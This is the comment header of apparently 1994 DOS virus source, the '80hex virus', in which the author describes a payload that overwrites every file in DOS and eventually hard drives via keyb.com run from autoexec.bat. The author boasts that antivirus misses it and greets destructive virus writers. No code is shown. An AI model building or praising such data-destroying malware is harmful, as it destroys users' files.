;                          - 80hex virus -
;              (c) 1994 The Unforgiven/Immortal Riot

; Pay-Load function:
;  This will be dropped to the file c:\dos\keyb.com, that often
;  is called from autoexec.bat, which will result in that all files
;  in DOS being overwritten. Eventually all hds will be trashed as well.

; General-information:
;  It's a simple overwriting virus, BUT not released 'alone' as
;  the purpose as a virus that will infect systems and travel
;  around the world. It's rather an original pay-load, outsmarted
;  by my creative/destructive brain.

;  It's not encrypted, still *NO* anti-virus detects it, this is probably
;  due to its simplistic shape. It's *highly* destructive, and is really
;  more or less a trojan. But it can replicate, so...

;  Greetings to all destructive virus writers!
